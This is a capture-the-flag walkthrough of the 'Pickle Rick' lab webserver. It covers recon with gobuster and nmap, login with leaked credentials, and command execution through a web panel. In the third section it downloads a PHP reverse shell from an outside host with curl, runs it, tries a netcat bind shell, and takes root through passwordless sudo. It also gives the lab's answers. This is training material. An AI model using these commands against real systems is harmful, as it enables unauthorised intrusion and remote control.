# Pickle rick

## Challenge info

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

## 1 - What is the first ingredient Rick needs?

Accessing the webpage there's some text and an image, viewing the source code there is a username

```
Username: R1ckRul3s
```

Issue a gobuster to recon the folders

```
/assets
```

Issue a gobuster to recon the folders (with common word list)

```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
```
there was nothing besides the images in this pages, so i tried a /login.php and it exists


Issue a nmap to recon the services

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:d0:58:44:f3:ea:b1:5f:c0:c6:6e:42:be:85:dd:78 (RSA)
|   256 d0:c7:98:36:9d:bd:78:a3:53:32:09:63:0f:30:71:76 (ECDSA)
|_  256 79:3d:82:c9:b1:7f:97:87:17:7b:b7:4f:f1:84:c6:89 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
```

Robots.txt content

```
Wubbalubbadubdub
```

Tried the username and the text found in robots as password, and it worked!

/login.php
username: R1ckRul3s
password: Wubbalubbadubdub

Caviat is that the only page accessible is the commands, the others suggest that this is a fake account for rick (since is rick rules, may be a Morty acc ?! :D )

First thing i tried in this command was <b>ls</b>, and yeah, it lists the cwd at the machine

```
ls

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Lets check what the first file has

```
cat Sup3rS3cretPickl3Ingred.txt
Command disabled

strings Sup3rS3cretPickl3Ingred.txt

mr. meeseek hair
```
### Answer: mr. meeseek hair

## 2 - Whats the second ingredient Rick needs?

Lets check the clue.txt

```
strings clue.txt

Look around the file system for the other ingredient.
```

Lets check the home directory

```
cd /home ; ls -la

total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Sep  9 19:50 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
```
We can access and edit the rick folder (we are www-data) but that is the current directory we just listed

The thing is that we need to list right after cd, otherwise it stay on that new path
```
cd /home/rick/ ; ls -la

total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients

strings /home/rick/second\ ingredients
1 jerry tear
```

### Answer: 1 jerry tear

## 3 - Whats the final ingredient Rick needs?

Lets just check the ubuntu folder for conscience check

```
ls -la /home/ubuntu/

total 40
drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10  2019 .
drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu  320 Feb 10  2019 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .cache
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo

unfortunately we cant read the ssh folder, to get the private key, lets just check the ones readable by us
```

Tried nc -l 9999 -e /bin/bash but no luck, to agilize things i just spawned a server in my local machine and from the remote i downloaded a php-reverse-shell to /tmp

Local
```
cp /usr/share/webshells/php/php-reverse-shell.php revshell.php
python -m SimpleHTTPServer
```

Remote
```
curl "http://10.9.128.84:8000/revshell.php" > /tmp/rev.php

strings /tmp/rev.php (just to check)
```

Now listen on the port that was set in the revshell file

```
nc -lnv 9999
```

Just exec the shell on the remote

```
php /tmp/rev.php &
```

Just check what www-data can run as sudo

```
sudo -l
(ALL) NOPASSWD: ALL

sudo su
whoami
# root

cd /root/

drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Sep  9 19:50 ..
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
drwx------  2 root root 4096 Feb 10  2019 .ssh

cat 3rd.txt
3rd ingredients: fleeb juice
```

### Answer: fleeb juice

The room is finalized, but im curious to see the other tabs in the web page

They all redirect to denied so, theres nothing there

Also, after solved, i found a base64 encoded string in the source code of /portal.php

but when recursively decoding, the final result reveals that i'm stupid: 

```
Decoded: rabit hole
```